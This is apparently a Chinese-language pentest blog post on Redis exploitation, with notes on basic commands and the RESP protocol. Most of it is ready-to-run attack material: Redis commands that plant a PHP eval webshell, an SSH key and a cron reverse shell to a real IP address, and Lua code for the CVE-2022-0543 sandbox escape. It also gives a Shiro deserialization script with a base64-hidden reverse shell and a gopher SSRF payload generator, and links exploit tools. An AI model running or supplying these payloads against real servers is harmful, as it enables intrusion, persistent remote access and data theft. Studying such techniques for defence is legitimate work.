---
title: Redis漏洞
date: 2023/5/10 15:00:25
categories:
- 漏洞复现
tags:
- 数据库攻防
---

# 环境搭建

[Redis - 各平台搭建Redis - 听雨危楼 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Neeo/articles/12673194.html#windows)

Vulhub



# 基本了解

Redis是C语言开发一个开源(遵循BSD)协议高性能的(key-value)键值对的**内存NoSQL数据库**,可以用作数据库、缓存、信息中间件(性能非常优秀，支持持久化到硬盘且高可用)，由于其自身特点，可以广泛应用在数据集群，分布式队列，信息中间件等网络架构中。



[Redis数据库常用命令](https://blog.csdn.net/qq_41384743/article/details/98211366)

```shell
# 启动
redis-server /etc/redis.conf
redis-cli -h host                        # 免密登录
redis-cli -h host -p port -a password    # 使用 Redis 密码登录 Redis 服务

# 进入命令行后
config get requirepass # 查看密码
config set requirepass passwd # 设置密码
auth passwd # 认证
info # 相关信息
SET key "Hello World"                        # 设置键 key 的值为字符串 Hello World
GET key                                     # 获取键 key 的值，如果 key 不存在，返回 nil 。如果key 储存的值不是字符串类型，返回一个错误
DEL key                                     # 删除键 key
KEYS *                                      # 获取 redis 中所有的 key,Keys 命令用于查找所有符合给定模式 pattern 的 key
SAVE                                           # 用于创建当前数据库的备份,在 redis 安装目录中创建dump.rdb文件
CONFIG GET requirepass                         # 用于获取 redis 服务的配置参数，通过 CONFIG 命令查看或设置配置项
Flushall                                    # 用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key)
SELECT index                                # Redis Select 命令用于切换到指定的数据库，数据库索引号 index 用数字值指定，以 0 作为起始索引值。
```



**redis服务器与客户端通信**

`Redis`服务器与客户端通过`RESP`（REdis Serialization Protocol）协议通信。

抓包

```bash
tcpdump port 6379 -w ./redis.pcap
```

执行命令

```shell
127.0.0.1:6379> auth 123456
OK
127.0.0.1:6379> set name khaz
OK
127.0.0.1:6379> get name
"khaz"
```

对应的数据包如下，每一行都是用`\r\n`隔开的。

![image-20221118232305305](../../../images/image-20221118232305305.png)

> 对于`Simple Strings`，回复的第一个字节是`+`
> 对于`error`，回复的第一个字节是`-`
> 对于`Integer`，回复的第一个字节是`:`
> 对于`Bulk Strings`，回复的第一个字节是`$`
> 对于`array`，回复的第一个字节是`*`
> 此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。
> 在RESP中，协议的不同部分始终以`"\r\n"(CRLF)`结束。



# 利用备份功能写入文件

## 原理

redis提供了备份数据库的功能，备份的文件名和备份的路径都可以通过

```bash
config set dbfilename
config set dir
```

来控制,从而可以实现任意文件写功能。



## 注意点

- 数据库备份为快照文件存在一定格式(脏数据)，所以写入的内容需要加上换行符。

- `flushall`命令

  `flushall`命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。

  redis默认有16个数据库

  ![image-20230920152903603](../../../images/image-20230920152903603.png)

  所以不用`flushall`来清空默认0号的数据库内容，只需要切换到其他的空数据库即可

  ```bash
  dbsize # 查看当前数据库的key数量
  select 4  # 选择没有数据的数据库
  ```

  

  

## 写入Webshell

- root权限执行的redis或者以某个web服务启动的redis
- 知道网站web路径

```bash
select 5
set 1 '\n\n<?php eval($_POST["cmd"]);?>\n\n'
config set dir /var/www/html
config set dbfilename shell.php
save
```



## 写入ssh公钥

- 高权限

![image-20231014092516237](../../../images/image-20231014092516237.png)

```bash
select 5
set 1 "\n\n公钥内容\n\n"
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```



## 写入计划任务反弹shell

- root权限

- Centos系统

  > 1. 因为默认redis写文件后是644的权限
  >
  >    **ubuntu**要求定时任务文件权限必须是**600**
  >
  >    **Centos**的定时任务文件权限**644**也能执行
  >
  > 2. 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错

```bash
select 5
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/124.220.192.120/1234 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

**定时任务位置**

- /etc/crontab文件

  ![image-20231014145035776](../../../images/image-20231014145035776.png)

- /etc/cron.xxx目录

  ```bash
  /etc/cron.d/
  /etc/cron.hourly/
  /etc/cron.daily/
  /etc/cron.weekly/
  /etc/cron.monthly/
  ```

  ![image-20231014145327815](../../../images/image-20231014145327815.png)

- 用户定时目录

  ```bash
  # Debian系列（Ubuntu）
  /var/spool/cron/crontabs/<username>
  
  # RedHat系列（Centos）
  /var/spool/cron/<username>
  ```

  



# 主从复制RCE

- 4.x >= Version <= 5.0.5

> 主从复制是指将一台Redis服务器的数据，复制到其他的Redis服务器。
>
> 前者称为主节点(master)，后者称为从节点(slave).
>
> 数据的复制是单向的，只能由主节点到从节点。
>
> **从节点在接收数据时，会先将自身的数据清空。**
>
> **建立主从关系只需要在从节点操作就行了，主节点不用任何操作**
>
> 主从复制RCE简单的说就是将Rouge Server（主节点）上的恶意.so文件复制到目标主机（从节点）上，从而达到RCE。



# Lua沙盒逃逸--CVE-2022-0543

## 漏洞复现

- 运行在Debian系列的linux上的Redis

  > 实际上是系统问题，而不是redis的问题
  >
  > 在 Debian 系的 Linux 发行版系统上，Lua的package 变量没有被正确清除，导致攻击者可以利用它来进行 Lua 沙箱逃逸，从而执行任意系统命令。

借助Lua沙箱中遗留的变量`package`的`loadlib`函数来加载动态链接库`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`里的导出函数`luaopen_io`。在Lua中执行这个导出函数，即可获得`io`库，再使用其执行命令：

```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("id", "r");
local res = f:read("*a");
f:close();
return res
```

**注意不同环境下的liblua库路径不同，需要指定一个正确的路径**

连接redis，使用`eval`命令执行上述脚本：

```verilog
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

工具一键执行命令

![image-20230920151956149](../../../images/image-20230920151956149.png)



# Shiro-Redis反序列化

shiro默认将session存储在内存里面。这样导致shiro的session是不共享的。使用redis来存储shiro session可以让其他服务也共享shiro的认证信息。

过程：shiro会根据jessionid来找到存储于redis中的session信息，并对其进行反序列化。

**向redis中插入恶意session信息**

```python
import pyyso
import redis

redis_conn=redis.StrictRedis(host="192.168.1.104", port=6379,password="abc123")

# whatever 是 session 名称
whatever=b"123"
key=b"shiro:session:"+whatever
value=pyyso.cb1v192('bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"')
print(value)
redis_conn.set(key,value)
```

![image-20230920210825530](../../../images/image-20230920210825530.png)

更改改JESSIONID为123，再次访问即可触发反序列化。



# SSRF打Redis

## 低版本情况

配合http请求

> 低版本的Redis会将http请求的请求头内容作为redis命令解析

### 需要认证情况

**先找到redis服务的认证密码，转到未授权情况**

- 配置文件

  ```php
  # 通过requirepass来定位密码
  /etc/redis.conf
  /etc/redis/redis.conf
  /usr/local/redis/etc/redis.conf
  /opt/redis/ect/redis.conf
  ```

- 弱密码爆破

  ```python
  dict://192.168.174.129:6379/AUTH passwd
  ```

  认证成功

  ![image-20221118222335249](../../../images/image-20221118222335249.png)

  认证失败

  ![image-20221118222420964](../../../images/image-20221118222420964.png)



### 未授权情况

**配合dict协议**

```php
dict://x.x.x.x:6379/<Redis 命令>
```

**配合gopher协议**

首先要将命令转换为RESP协议格式

```python
import urllib.request, urllib.parse, urllib.error

protocol="gopher://"
ip="192.168.163.128"
port="6379"

# 写马
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n" #写入的文件内容
filename="shell.php"
path="/var/www/html" # web目录

# 写ssh公钥
/*
filename="authorized_keys"
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"
path="/root/.ssh/"
*/

# 计划任务反弹shell  系统必须为Centos，定时任务权限问题：Centos--644  Ubuntu--600
/*
reverse_ip="192.168.163.132"
reverse_port="2333"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)
filename="root"
path="/var/spool/cron"
*/


passwd=""

cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]


# 如果redis需要认证，就在cmd第一行插入认证命令
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
    
payload=protocol+ip+":"+port+"/_"  # "/_" gopher协议特性，会吃掉url后的一个字符

def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(payload)
```





# Windows下的思路--没试

**Windows的Redis版本停留在3.2**

**Windows的自启动：系统服务、计划任务、注册表启动项、用户的startup目录**

[踩坑记录-Redis(Windows)的getshell - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7940)





# Redis挖矿

Redis 未授权访问漏洞分析 cleanfda 脚本复现漏洞挖矿 - 博客文章 - 任霏的个人博客网站
https://www.renfei.net/posts/1003501





# 漏洞利用工具

[yuyan-sec/RedisEXP: Redis 漏洞利用工具 (github.com)](https://github.com/yuyan-sec/RedisEXP)

[n0b0dyCN/redis-rogue-server: Redis(<=5.0.5) RCE (github.com)](https://github.com/n0b0dyCN/redis-rogue-server)





# 参考文章

[浅析Linux下Redis的攻击面(一) - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7974#toc-19)

[redis未授权到shiro反序列化 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11198#toc-5)

[redis未授权到shiro反序列化之session回显马|NOSEC安全讯息平台 - 白帽汇安全研究院](https://nosec.org/home/detail/5041.html)

[浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5665#toc-16)